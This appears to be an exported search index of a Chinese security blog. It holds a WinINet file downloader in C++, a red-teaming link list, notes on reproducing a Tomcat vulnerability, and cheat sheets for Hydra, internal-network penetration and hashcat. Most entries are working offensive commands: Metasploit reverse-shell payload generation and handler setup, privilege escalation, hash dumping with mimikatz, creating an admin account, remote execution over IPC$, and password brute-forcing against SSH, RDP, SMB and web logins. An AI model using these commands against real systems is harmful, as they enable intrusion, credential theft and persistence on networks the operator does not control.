<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[wininet_downloader_cpp]]></title>
    <url>%2F2019%2F02%2F28%2Fwininet_downloader_cpp.html</url>
    <content type="text"><![CDATA[wininet.lib cpp 下载 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231#include &lt;windows.h&gt;#include &lt;wininet.h&gt;#include &lt;string&gt;#include &lt;iostream&gt;using namespace std; #pragma comment(lib, "wininet.lib") #define DOWNHELPER_AGENTNAME "downloader"#define LEN_OF_BUFFER_FOR_QUERYINFO 128#define DOWNLOAD_BUF_SIZE (10*1024) #define MAX_DOWNLOAD_REQUEST_TIME 10 #define MAX_DOWNLOAD_BYTESIZE (10000*1024*1024) BOOL _TryHttpSendRequest(LPVOID hRequest, int nMaxTryTimes); BOOL DownloadUrl(std::string strUrl, std::string strFileName)&#123; BOOL bRet = FALSE; if (strUrl == "" || strFileName == "") return FALSE; HINTERNET hInet = NULL; HINTERNET hConnect = NULL; HINTERNET hRequestHead = NULL; HINTERNET hRequestGet = NULL; HANDLE hFileWrite = NULL; char* pBuf = NULL; DWORD dwRequestTryTimes = MAX_DOWNLOAD_REQUEST_TIME; DWORD dwDownBytes = 0; DWORD dwDownFileTotalBytes = 0; DWORD dwWriteBytes = 0; char bufQueryInfo[LEN_OF_BUFFER_FOR_QUERYINFO] = &#123;0&#125;; DWORD dwBufQueryInfoSize = sizeof(bufQueryInfo); DWORD dwStatusCode = 0; DWORD dwContentLen = 0; DWORD dwSizeDW = sizeof(DWORD); CHAR pszHostName[INTERNET_MAX_HOST_NAME_LENGTH] = &#123;0&#125;; CHAR pszUserName[INTERNET_MAX_USER_NAME_LENGTH] = &#123;0&#125;; CHAR pszPassword[INTERNET_MAX_PASSWORD_LENGTH] = &#123;0&#125;; CHAR pszURLPath[INTERNET_MAX_URL_LENGTH] = &#123;0&#125;; CHAR szURL[INTERNET_MAX_URL_LENGTH] = &#123;0&#125;; URL_COMPONENTSA urlComponents = &#123;0&#125;; urlComponents.dwStructSize = sizeof(URL_COMPONENTSA); urlComponents.lpszHostName = pszHostName; urlComponents.dwHostNameLength = INTERNET_MAX_HOST_NAME_LENGTH; urlComponents.lpszUserName = pszUserName; urlComponents.dwUserNameLength = INTERNET_MAX_USER_NAME_LENGTH; urlComponents.lpszPassword = pszPassword; urlComponents.dwPasswordLength = INTERNET_MAX_PASSWORD_LENGTH; urlComponents.lpszUrlPath = pszURLPath; urlComponents.dwUrlPathLength = INTERNET_MAX_URL_LENGTH; bRet = InternetCrackUrlA(strUrl.c_str(), 0, NULL, &amp;urlComponents); bRet = (bRet &amp;&amp; urlComponents.nScheme == INTERNET_SERVICE_HTTP); if (!bRet) &#123; goto _END_OF_DOWNLOADURL; &#125; hInet = InternetOpenA(DOWNHELPER_AGENTNAME, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, NULL); if (!hInet) &#123; bRet = FALSE; goto _END_OF_DOWNLOADURL; &#125; hConnect = InternetConnectA(hInet, pszHostName, urlComponents.nPort, pszUserName, pszPassword, INTERNET_SERVICE_HTTP, 0, NULL); if (!hConnect) &#123; bRet = FALSE; goto _END_OF_DOWNLOADURL; &#125; if (urlComponents.dwUrlPathLength != 0) strcpy(szURL, urlComponents.lpszUrlPath); else strcpy(szURL, "/"); hRequestHead = HttpOpenRequestA(hConnect, "HEAD", szURL, "HTTP/1.1", "", NULL, INTERNET_FLAG_RELOAD, 0); bRet = _TryHttpSendRequest(hRequestHead, dwRequestTryTimes); if (!bRet) &#123; goto _END_OF_DOWNLOADURL; &#125; dwContentLen = 0; dwSizeDW = sizeof(DWORD); bRet = HttpQueryInfo(hRequestHead, HTTP_QUERY_FLAG_NUMBER | HTTP_QUERY_CONTENT_LENGTH, &amp;dwContentLen, &amp;dwSizeDW, NULL); if (bRet) &#123; if (dwContentLen &gt; MAX_DOWNLOAD_BYTESIZE) &#123; bRet = FALSE; goto _END_OF_DOWNLOADURL; &#125; &#125; hRequestGet = HttpOpenRequestA(hConnect, "GET", szURL, "HTTP/1.1", "", NULL, INTERNET_FLAG_RELOAD, 0); bRet = _TryHttpSendRequest(hRequestGet, dwRequestTryTimes); if (!bRet) &#123; goto _END_OF_DOWNLOADURL; &#125; hFileWrite = CreateFileA(strFileName.c_str(), GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); if (INVALID_HANDLE_VALUE == hFileWrite) &#123; bRet = FALSE; goto _END_OF_DOWNLOADURL; &#125; pBuf = new char[DOWNLOAD_BUF_SIZE]; if (!pBuf) &#123; bRet = FALSE; goto _END_OF_DOWNLOADURL; &#125; dwDownFileTotalBytes = 0; while (1) &#123; dwDownBytes = 0; memset(pBuf, 0, DOWNLOAD_BUF_SIZE*sizeof(char)); bRet = InternetReadFile(hRequestGet, pBuf, DOWNLOAD_BUF_SIZE, &amp;dwDownBytes); if (bRet) &#123; if (dwDownBytes &gt; 0) &#123; dwDownFileTotalBytes += dwDownBytes; bRet = WriteFile(hFileWrite, pBuf, dwDownBytes, &amp;dwWriteBytes, NULL); if (!bRet) &#123; goto _END_OF_DOWNLOADURL; &#125; &#125; else if (0 == dwDownBytes) &#123; bRet = TRUE; break; &#125; &#125; &#125; _END_OF_DOWNLOADURL: if (INVALID_HANDLE_VALUE != hFileWrite) CloseHandle(hFileWrite); if (pBuf) delete [] pBuf; if (hRequestGet) InternetCloseHandle(hRequestGet); if (hRequestHead) InternetCloseHandle(hRequestHead); if (hConnect) InternetCloseHandle(hConnect); if (hInet) InternetCloseHandle(hInet); return bRet;&#125; BOOL _TryHttpSendRequest(LPVOID hRequest, int nMaxTryTimes)&#123; BOOL bRet = FALSE; DWORD dwStatusCode = 0; DWORD dwSizeDW = sizeof(DWORD); while (hRequest &amp;&amp; (nMaxTryTimes-- &gt; 0)) &#123; bRet = HttpSendRequestA(hRequest, NULL, 0, NULL, 0); if (!bRet) &#123; continue; &#125; else &#123; dwStatusCode = 0; dwSizeDW = sizeof(DWORD); bRet = HttpQueryInfo(hRequest, HTTP_QUERY_FLAG_NUMBER | HTTP_QUERY_STATUS_CODE, &amp;dwStatusCode, &amp;dwSizeDW, NULL); if (bRet) &#123; if (HTTP_STATUS_OK == dwStatusCode) &#123; break; &#125; else &#123; bRet = FALSE; continue; &#125; &#125; &#125; &#125; return bRet;&#125; int main(int argc, char* argv[])&#123; cout&lt;&lt; "pls input downloadurl:"; char str[80]; cin.get(str,80); BOOL bR = DownloadUrl(str, "temp.png"); cout &lt;&lt; "Downloading..."&lt;&lt;endl; if (bR) cout &lt;&lt; "ok" &lt;&lt; endl; else cout &lt;&lt; "no" &lt;&lt; endl; return 0;&#125;]]></content>
      <categories>
        <category>code</category>
      </categories>
      <tags>
        <tag>code</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Red Teaming Tools]]></title>
    <url>%2F2019%2F02%2F28%2FAwesome%20Red%20Teaming.html</url>
    <content type="text"><![CDATA[Awesome Red TeamingList of Awesome Red Team / Red Teaming Resources This list is for anyone wishing to learn about Red Teaming but do not have a starting point. Anyway, this is a living resources and will update regularly with latest Adversarial Tactics and Techniques based on Mitre ATT&amp;CK You can help by sending Pull Requests to add more information. Table of Contents Initial Access Execution Persistence Privilege Escalation Defense Evasion Credential Access Discovery Lateral Movement Collection Exfiltration Command and Control Embedded and Peripheral Devices Hacking Misc RedTeam Gadgets Ebooks Training Certification ↑ Initial Access How To: Empire’s Cross Platform Office Macro Phishing with PowerPoint PHISHING WITH EMPIRE Bash Bunny OWASP Presentation of Social Engineering - OWASP USB Drop Attacks: The Danger of “Lost And Found” Thumb Drives Weaponizing data science for social engineering: Automated E2E spear phishing on Twitter - Defcon 23 Cobalt Strike - Spear Phishing documentation Cobalt Strike Blog - What’s the go-to phishing technique or exploit? Spear phishing with Cobalt Strike - Raphael Mudge EMAIL RECONNAISSANCE AND PHISHING TEMPLATE GENERATION MADE SIMPLE Phishing for access Excel macros with PowerShell PowerPoint and Custom Actions Macro-less Code Exec in MSWord Multi-Platform Macro Phishing Payloads Abusing Microsoft Word Features for Phishing: “subDoc” Phishing Against Protected View POWERSHELL EMPIRE STAGERS 1: PHISHING WITH AN OFFICE MACRO AND EVADING AVS The PlugBot: Hardware Botnet Research Project Luckystrike: An Evil Office Document Generator The Absurdly Underestimated Dangers of CSV Injection Macroless DOC malware that avoids detection with Yara rule Phishing between the app whitelists Executing Metasploit &amp; Empire Payloads from MS Office Document Properties (part 1 of 2) Executing Metasploit &amp; Empire Payloads from MS Office Document Properties (part 2 of 2) Social Engineer Portal 7 Best social Engineering attack Using Social Engineering Tactics For Big Data Espionage - RSA Conference Europe 2012 USING THE DDE ATTACK WITH POWERSHELL EMPIRE Phishing on Twitter - POT Microsoft Office – NTLM Hashes via Frameset Defense-In-Depth write-up Spear Phishing 101 ↑ Execution Research on CMSTP.exe, Windows oneliners to download remote payload and execute arbitrary code Executing Commands and Bypassing AppLocker with PowerShell Diagnostic Scripts WSH Injection: A Case Study Gscript Dropper ↑ Persistence A View of Persistence hiding registry keys with psreflect Persistence using RunOnceEx – Hidden from Autoruns.exe Persistence using GlobalFlags in Image File Execution Options – Hidden from Autoruns.exe Putting data in Alternate data streams and how to execute it – part 2 WMI Persistence with Cobalt Strike Leveraging INF-SCT Fetch &amp; Execute Techniques For Bypass, Evasion, &amp; Persistence Leveraging INF-SCT Fetch &amp; Execute Techniques For Bypass, Evasion, &amp; Persistence (Part 2) Vshadow: Abusing the Volume Shadow Service for Evasion, Persistence, and Active Directory Database Extraction ↑ Privilege EscalationUser Account Control Bypass First entry: Welcome and fileless UAC bypass, Exploiting Environment Variables in Scheduled Tasks for UAC Bypass, Reading Your Way Around UAC in 3 parts: Part 1. Part 2. Part 3. Bypassing UAC using App Paths, “Fileless” UAC Bypass using sdclt.exe, UAC Bypass or story about three escalations, “Fileless” UAC Bypass Using eventvwr.exe and Registry Hijacking, Bypassing UAC on Windows 10 using Disk Cleanup, Using IARPUninstallStringLauncher COM interface to bypass UAC, Fileless UAC Bypass using sdclt Eventvwr File-less UAC Bypass CNA Windows 7 UAC whitelist Escalation Windows Privilege Escalation Checklist From Patch Tuesday to DA A Path for Privilege Escalation ↑ Defense Evasion Window 10 Device Guard Bypass App Locker ByPass List Window Signed Binary Bypass Application Whitelisting Script Protections - Regsvr32.exe &amp; COM Scriptlets (.sct files) Bypassing Application Whitelisting using MSBuild.exe - Device Guard Example and Mitigations Empire without powershell Powershell without Powershell to bypass app whitelist MS Signed mimikatz in just 3 steps Hiding your process from sysinternals code signing certificate cloning attacks and defenses userland api monitoring and code injection detection In memory evasion Bypassing AMSI via COM Server Hijacking process doppelganging Week of Evading Microsoft ATA - Announcement and Day 1 to Day 5 VEIL-EVASION AES ENCRYPTED HTTPKEY REQUEST: SAND-BOX EVASION Putting data in Alternate data streams and how to execute it AppLocker – Case study – How insecure is it really? – Part 1 AppLocker – Case study – How insecure is it really? – Part 2 Harden Windows with AppLocker – based on Case study part 2 Harden Windows with AppLocker – based on Case study part 2 Office 365 Safe links bypass Windows Defender Attack Surface Reduction Rules bypass Bypassing Device guard UMCI using CHM – CVE-2017-8625 Bypassing Application Whitelisting with BGInfo Cloning and Hosting Evil Captive Portals using a Wifi PineApple https://bohops.com/2018/01/23/loading-alternate-data-stream-ads-dll-cpl-binaries-to-bypass-applocker/ Executing Commands and Bypassing AppLocker with PowerShell Diagnostic Scripts mavinject.exe Functionality Deconstructed ↑ Credential Access Windows Access Tokens and Alternate credentials Bringing the hashes home with reGeorg &amp; Empire Intercepting passwords with Empire and winning Local Administrator Password Solution (LAPS) Part 1 Local Administrator Password Solution (LAPS) Part 2 USING A SCF FILE TO GATHER HASHES Remote Hash Extraction On Demand Via Host Security Descriptor Modification Offensive Encrypted Data Storage Practical guide to NTLM Relaying Dump Clear-Text Passwords for All Admins in the Domain Using Mimikatz DCSync Dumping Domain Password Hashes ↑ Discovery Red Team Operating in a Modern Environment My First Go with BloodHound Introducing BloodHound A Red Teamer’s Guide to GPOs and OUs Automated Derivative Administrator Search A Pentester’s Guide to Group Scoping Local Group Enumeration The PowerView PowerUsage Series #1 - Mass User Profile Enumeration The PowerView PowerUsage Series #2 – Mapping Computer Shortnames With the Global Catalog The PowerView PowerUsage Series #3 – Enumerating GPO edit rights in a foreign domain The PowerView PowerUsage Series #4 – Finding cross-trust ACEs Aggressor PowerView Lay of the Land with BloodHound Scanning for Active Directory Privileges &amp; Privileged Accounts Microsoft LAPS Security &amp; Active Directory LAPS Configuration Recon Trust Direction: An Enabler for Active Directory Enumeration and Trust Exploitation SPN Discovery ↑ Lateral Movement A Citrx Story Jumping Network Segregation with RDP Pass hash pass ticket no pain Abusing DNSAdmins privilege for escalation in Active Directory Using SQL Server for attacking a Forest Trust Extending BloodHound for Red Teamers OPSEC Considerations for beacon commands My First Go with BloodHound Kerberos Party Tricks: Weaponizing Kerberos Protocol Flaws Lateral movement using excel application and dcom Lay of the Land with BloodHound The Most Dangerous User Right You (Probably) Have Never Heard Of Agentless Post Exploitation A Guide to Attacking Domain Trusts Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy Targeted Kerberoasting Kerberoasting Without Mimikatz Abusing GPO Permissions Abusing Active Directory Permissions with PowerView Roasting AS-REPs Getting the goods with CrackMapExec: Part 1 Getting the goods with CrackMapExec: Part 2 DiskShadow: The Return of VSS Evasion, Persistence, and Active Directory Database Extraction Abusing Exported Functions and Exposed DCOM Interfaces for Pass-Thru Command Execution and Lateral Movement a guide to attacking domain trusts Outlook Home Page – Another Ruler Vector Outlook Forms and Shells Abusing the COM Registry Structure: CLSID, LocalServer32, &amp; InprocServer32 LethalHTA - A new lateral movement technique using DCOM and HTA Abusing DCOM For Yet Another Lateral Movement Technique ↑ Collection Accessing clipboard from the lock screen in Windows 10 Part 1 Accessing clipboard from the lock screen in Windows 10 Part 2 ↑ Exfiltration DNS Data exfiltration — What is this and How to use? DNS Tunnelling sg1: swiss army knife for data encryption, exfiltration &amp; covert communication Data Exfiltration over DNS Request Covert Channel: DNSExfiltrator DET (extensible) Data Exfiltration Toolkit Data Exfiltration via Formula Injection Part1 ↑ Command and ControlDomain Fronting Empre Domain Fronting Escape and Evasion Egressing Restricted Networks - Tom Steele and Chris Patten Finding Frontable Domain TOR Fronting – Utilising Hidden Services for Privacy Simple domain fronting PoC with GAE C2 server Domain Fronting Via Cloudfront Alternate Domains Finding Domain frontable Azure domains - thoth / Fionnbharr (@a_profligate) Google Groups: Blog post on finding 2000+ Azure domains using Censys Red Team Insights on HTTPS Domain Fronting Google Hosts Using Cobalt Strike SSL Domain Fronting 101 How I Identified 93k Domain-Frontable CloudFront Domains Validated CloudFront SSL Domains CloudFront Hijacking CloudFrunt GitHub Repo Connection Proxy Redirecting Cobalt Strike DNS Beacons Apache2Mod Rewrite Setup Cobalt Strike HTTP C2 Redirectors with Apache mod_rewrite High-reputation Redirectors and Domain Fronting Cloud-based Redirectors for Distributed Hacking Combatting Incident Responders with Apache mod_rewrite Operating System Based Redirection with Apache mod_rewrite Invalid URI Redirection with Apache mod_rewrite Strengthen Your Phishing with Apache mod_rewrite and Mobile User Redirection mod_rewrite rule to evade vendor sandboxes Expire Phishing Links with Apache RewriteMap Serving random payloads with NGINX Mod_Rewrite Automatic Setup Hybrid Cobalt Strike Redirectors Expand Your Horizon Red Team – Modern SAAS C2 RTOps: Automating Redirector Deployment With Ansible Web Services C2 with Dropbox C2 with gmail C2 with twitter Office 365 for Cobalt Strike C2 Red Team Insights on HTTPS Domain Fronting Google Hosts Using Cobalt Strike A stealthy Python based Windows backdoor that uses Github as a C&amp;C server External C2 (Third-Party Command and Control) Cobalt Strike over external C2 – beacon home in the most obscure ways External C2 for Cobalt Strike External C2 framework for Cobalt Strike External C2 framework - GitHub Repo Hiding in the Cloud: Cobalt Strike Beacon C2 using Amazon APIs Exploring Cobalt Strike’s ExternalC2 framework Application Layer Protocol C2 WebSocket C2 WMI C2 Website C2 Image C2 Javascript C2 WebInterface C2 with DNS C2 with https C2 with webdav Introducing Merlin — A cross-platform post-exploitation HTTP/2 Command &amp; Control Tool InternetExplorer.Application for C2 Infrastructure Automated Red Team Infrastructure Deployment with Terraform - Part 1 Automated Red Team Infrastructure Deployment with Terraform - Part 2 Red Team Infrastructure - AWS Encrypted EBS 6 RED TEAM INFRASTRUCTURE TIPS How to Build a C2 Infrastructure with Digital Ocean – Part 1 Infrastructure for Ongoing Red Team Operations Attack Infrastructure Log Aggregation and Monitoring Randomized Malleable C2 Profiles Made Easy Migrating Your infrastructure ICMP C2 Using WebDAV features as a covert channel Safe Red Team Infrastructure EGRESSING BLUECOAT WITH COBALTSTIKE &amp; LET’S ENCRYPT Command and Control Using Active Directory A Vision for Distributed Red Team Operations Designing Effective Covert Red Team Attack Infrastructure Serving Random Payloads with Apache mod_rewrite Mail Servers Made Easy Securing your Empire C2 with Apache mod_rewrite Automating Gophish Releases With Ansible and Docker How to Write Malleable C2 Profiles for Cobalt Strike How to Make Communication Profiles for Empire A Brave New World: Malleable C2 Malleable Command and Control ↑ Embedded and Peripheral Devices Hacking Gettting in with the Proxmark3 &amp; ProxBrute Practical Guide to RFID Badge copying Contents of a Physical Pentester Backpack MagSpoof - credit card/magstripe spoofer Wireless Keyboard Sniffer RFID Hacking with The Proxmark 3 Swiss Army Knife for RFID Exploring NFC Attack Surface Outsmarting smartcards Reverse engineering HID iClass Master keys Android Open Pwn Project (AOPP) ↑ Misc Red Tips of Vysec Cobalt Strike Tips for 2016 ccde red teams Models for Red Team Operations Planning a Red Team exercise Raphael Mudge - Dirty Red Team tricks introducing the adversary resilience methodology part 1 introducing the adversary resilience methodology part 2 Responsible red team Red Teaming for Pacific Rim CCDC 2017 How I Prepared to Red Team at PRCCDC 2015 Red Teaming for Pacific Rim CCDC 2016 Responsible Red Teams ↑ RedTeam GadgetsNetwork Implants LAN Tap Pro LAN Turtle Bash Bunny Packet SquirrelWifi Auditing WiFi Pineapple Alpha Long range Wireless USB Wifi-Deauth Monster Crazy PAIoT BLE Key Proxmark3 Zigbee Sniffer Attify IoT Exploit kitSoftware Defined Radio - SDR HackRF One Bundle RTL-SDR YARD stick one Bundle UbertoothMisc Key Grabber Magspoof Poison tap keysweeper USB Rubber Ducky ↑ Ebooks Next Generation Red Teaming Targeted Cyber Attack Advanced Penetration Testing: Hacking the World’s Most Secure Networks Social Engieers’ Playbook Pretical Pretexting ↑ Training ( Free ) Tradecraft - a course on red team operations Advanced Threat Tactics Course &amp; Notes ↑ Certification CREST Certified Simulated Attack Specialist CREST Certified Simulated Attack Manager SEC564: Red Team Operations and Threat Emulation ELearn Security Penetration Testing eXtreme]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2017-12615漏洞复现]]></title>
    <url>%2F2019%2F02%2F28%2FCVE-2017-12615.html</url>
    <content type="text"><![CDATA[漏洞利用条件和方式: CVE-2017-12615漏洞利用需要在Windows环境，且需要将 readonly 初始化参数由默认值设置为 false，经过实际测试，Tomcat 7.x版本内web.xml配置文件内默认配置无readonly参数，需要手工添加，默认配置条件下不受此漏洞影响。 CVE-2017-12616影响范围：Apache Tomcat 7.0.0 - 7.0.80 CVE-2017-12615影响范围： Apache Tomcat 7.0.0 - 7.0.79 安装tomcat U:test P:test123 JAVA_HOME= C:\Program Files\Java\jdk1.7.0_25 CLASSPATH= .;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar; Path= %JAVA_HOME%/bin 新增2个变量 CATALINA_HOME= tomcat路径 CATALINA_BASE= tomcat路径 CLASSPATH=;%TALINA_HOME%\common\lib\servlet.jar 1、开始—-控制面板—-系统和安全—-windows防火墙—-高级设置 2、选择“入站规则”—-点击“新建规则”—-“规则类型”选择“端口”—-“下一步”—-该规则应用于，选择“TCP”—-“特定本地端口”输入“8080”(Tomcat使用的端口)—-“下一步”—-选择“允许连接”，点击“下一步”—-何时应用该规则，默认全选，点击“下一步”—-为该规则起一个名称，如“Tomcat开放8080端口”—-点击“完成” 3、Server.xml 123&lt;Connector port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot;connectionTimeout=&quot;20000&quot;redirectPort=&quot;8443&quot; address=&quot;0.0.0.0&quot; /&gt; C:\Program Files\Apache Software Foundation\Tomcat 7.0\conf\web.xml 增加 123456 &lt;init-param&gt; &lt;param-name&gt;readonly&lt;/param-name&gt; &lt;param-value&gt;false&lt;/param-value&gt;&lt;/init-param&gt; 提示 404。通过描述中的 Windows 受影响，可以结合 Windows 的特性。其一是 NTFS 文件流，其二是文件名的相关限制（如 Windows 中文件名不能以空格结尾）来绕过限制： 7.0.81]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hydra 的使用]]></title>
    <url>%2F2019%2F02%2F26%2Fhydra-%E7%9A%84%E4%BD%BF%E7%94%A8.html</url>
    <content type="text"><![CDATA[字典集https://www.weakpass.com/1.破解ssh（1）破解指定用户名密码 hydra ip ssh -l 用户名 -P 密码字典 -t 线程(默认16) -vVhydra ip ssh -l 用户名 -P 密码字典 -e ns -vV （2）批量破解ssh账号和密码 hydra -L weakpwd.txt -P weakpwd.txt 196.219.53.1 ssh -Vhydra -L list_user -P list_password 192.168.56.101 ssh -V 2.破解ftp （1）破解指定用户名密码 hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vVhydra ip ftp -l 用户名 -P 密码字典 -e ns -vV （2）批量破解FTP账号和密码 hydra -L weakpwd.txt -P weakpwd.txt 196.219.53.1 ftp -Vhydra -L list_user -P list_password 192.168.56.101 ftp -V 3．GET方式提交，破解Web登录 hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /admin/hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php 4．POST方式提交，破解Web登录4．POST方式提交，破解Web登录 （1）hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form “/admin/login.php: username= ^USER^ &amp;password=^PASS^&amp;submit=login:sorry password” hydra -L list_user -P list_password 192.168.0.115 http-post-form “member.php?mod=logging&amp;action=login&amp;loginsubmit=yes&amp;infloat=yes&amp;lssubmit=yes&amp;inajax=1:fastloginfield=username&amp;username=^USER^&amp;password=^PASS^&amp;quickforward=yes&amp;handlekey=ls:Login failed” –V （2）对admin密码进行破解 hydra -t 3 -l admin -P pass.txt -o out.txt -f 192.168.0.115 http-post-form “login.php:id=^USER^&amp;passwd=^PASS^:wrong username or password“ “-t”表示同时线程数为3；“-l”表示用户名是“admin”，字典为pass.txt，保存为out.txt；“-f”表示破解1个密码就停止；“192.168.0.115”表示目标IP地址；“http-post-form”表示采用HTTP的POST方式提交表单密码破解； 5．破解HTTPS hydra -m /index.php -l muts -P pass.txt 192.168.0.115 https 6．破解teamspeak hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak 7．破解Cisco hydra -P pass.txt 192.168.0.115 ciscohydra -m cloud -P pass.txt 192.168.0.115 cisco-enable 8．破解SMB hydra -l administrator -P pass.txt 192.168.0.115 smb 9．破解POP3 hydra -l muts -P pass.txt my.pop3.mail pop3 10．破解远程终端账号 （1）破解管理员账号 hydra ip rdp -l administrator -P pass.txt -V （2）批量破解账号 hydra -s 3389 192.168.44.138 rdp -L user.txt -P pwd.txt –V 11．破解HTTP-Proxy hydra -l admin -P pass.txt http-proxy://192.168.0.115 12．破解IMAP hydra -L user.txt -p secret 192.168.0.115 imap PLAINhydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>hydra</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[内网渗透小记]]></title>
    <url>%2F2019%2F02%2F26%2F%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B0%8F%E8%AE%B0.html</url>
    <content type="text"><![CDATA[常用一句话webshellhttps://github.com/tennc/webshell 信息收集1234567891011121314151617181920212223242526272829303132333435363738dnscmd &lt;servername&gt; /ZonePrint &lt;zonename&gt; 查看dns列表（DC执行）tasklist /SVC 查看系统进程及其描述query user || qwinsta 查看当前在线用户net user 查看本机用户net user /domain 查看域用户net view &amp; net group &quot;domain computers&quot; /domain 查看当前域计算机列表 第二个查的更多net view /domain 查看有几个域net view \\\\dc 查看 dc 域内共享文件net group /domain 查看域里面的组net group &quot;domain admins&quot; /domain 查看域管net localgroup administrators /domain /这个也是查域管，是升级为域控时，本地账户也成为域管net group &quot;domain controllers&quot; /domain 域控net time /domain net config workstation 当前登录域 - 计算机名 - 用户名net use \\\\域控(如pc.xx.com) password /user:xxx.com\username 相当于这个帐号登录域内主机，可访问资源ipconfigsysteminfotasklist /svc 详细进程信息tasklist /S ip /U domain\username /P /V 查看远程计算机 tasklisttaskkill /im imagename /f 结束进程net localgroup administrators &amp;&amp; whoami 查看当前是不是属于管理组netstat -anonltest /dclist:xx 查看域控nltest /domain_trusts 查看域信任信息whoami /all 查看 Mandatory Label uac 级别和 sid 号net sessoin 查看远程连接 session (需要管理权限)net share 共享目录cmdkey /l 查看保存登陆凭证echo %logonserver% 查看登陆域spn –l administrator spn 记录set 环境变量dsquery server - 查找目录中的 AD DC/LDS 实例dsquery user - 查找目录中的用户dsquery computer 查询所有计算机名称 windows 2003dir /s *.exe 查找指定目录下及子目录下没隐藏文件arp -atracert 查路由 windows 下载文件 bitsadmin 12download文件bitsadmin /transfer n https://www.baidu.com/robots.txt c:\1.txt powershell 12345一条命令download文件powershell (new-object System.Net.WebClient).DownloadFile('https://www.baidu.com/robots.txt','C:\1.txt')多条命令download文件$client = new-object System.Net.WebClient$client.DownloadFile('https://www.baidu.com/robots.txt', 'C:\1.txt') 添加删除用户操作12net user admin1 P@ssw0rd /add &amp; net localgroup administrators admin1 /add 添加用户并设置管理员net user admin1 /del 内网代理工具EWtools:http://rootkiter.com/EarthWorm正向：被攻击机(跳板)： ./ew_for_Linux -s ssocksd -l 9999 (侦听 0.0.0.0:9999)netstat -pantu|grep 9999 (查看是否侦听成功) 攻击机： proxychain 设置 socks5 为跳板 ip portproxychain nmap 即可以用跳板代理扫描其他主机 netsh Windows 自带工具 windows 端口转发123netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=53 connectaddress=10.10.10.4 connectport=8880netsh interface portproxy show v4tov4netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=53 MSF反弹 shell msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe &gt; shell.exe 1.生成一个回连木马 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.111 LPORT=443 -f dll&gt;/root/Desktop/443.dll 2.生成木马后，我们在菜刀里放入生成的木马，运行，同时打开msf准备回连 use exploit/multi/handler set payload windows/meterpreter/reverse_tcpset LHOST 192.168.2.111set lport 443run 4.提权 background 或 ctrl+z use exploit/windows/local/ms11_080_afdjoinleafset session 1runhashdump //密码获取load mimikatz //使用mimikatzkerberos //查看解密 5.新加路由查看子网 routebackgroundsessionsroute add 192.168.2.0 255.255.255.0 2search mssql //找mssql模块use auxiliary/scanner/mssql/mssql_login //使用login模块 show options set rhosts 192.168.177.1/24 set password sa@123runshow optionsset BEUTEFORCE_SPEED 0run 端口扫描search portscan use auxiliary/scanner/portscan/tcp //使用scanner模块show optionsset RHOSTS 192.168.2.0/24set ports 139,445,3389 //设置扫描端口 ipc$ D:&gt;net use \192.168.1.254\c$ “pwd” /user:user //连接192.168.1.254的IPC$共享，用unc路径D:&gt;copy srv.exe \192.168.1.254\c$ //复制本地 srv.exe 到C根目录D:&gt;net time \192.168.1.254 //查时间D:&gt;at \192.168.1.254 10:50 srv.exe //用at命令在10点50分启动 srv.exeD:&gt;net use \192.168.1.254\c$ /del]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>MSF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hashcat Readme]]></title>
    <url>%2F2019%2F01%2F18%2Fhashcat-readme.html</url>
    <content type="text"><![CDATA[#################################################################&amp; hashcat4.0.1 or 4.1.0 &amp; ################################################################# hash r.txt文件格式 用户名:hash –show 导出已破解的用户名:密码 outr.txt hashcat64.exe -a 3 -m 1000 –show –outfile=C:\Users\hash\Desktop\outr.txt –outfile-format 3 –username c:\Users\hash\Desktop\r.txt –left 导出未破解的用户名:hash leftr.txt hashcat64.exe -a 3 -m 1000 –left –outfile=C:\Users\hash\Desktop\leftr.txt –outfile-format 1 –username c:\Users\hash\Desktop\r.txt 增加密码复杂度命令破解leftr.txt（未破解的用户名:hash） hashcat64.exe -a 3 -m 1000 –outfile=C:\Users\hash\Desktop\outr1.txt –outfile-format 3 –username c:\Users\hash\Desktop\leftr.txt –increment –increment-min=6 –increment-max=16 ?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a –force 结束以后导出未爆破用户名加hash.txt hashcat64.exe -a 3 -m 1000 –left –outfile=C:\Users\hash\Desktop\leftr2.txt –outfile-format 1 –username c:\Users\hash\Desktop\leftr.txt hashcat64.exe -a 3 -m 1000 –outfile=C:\Users\hash\Desktop\out-1.txt –outfile-format 3 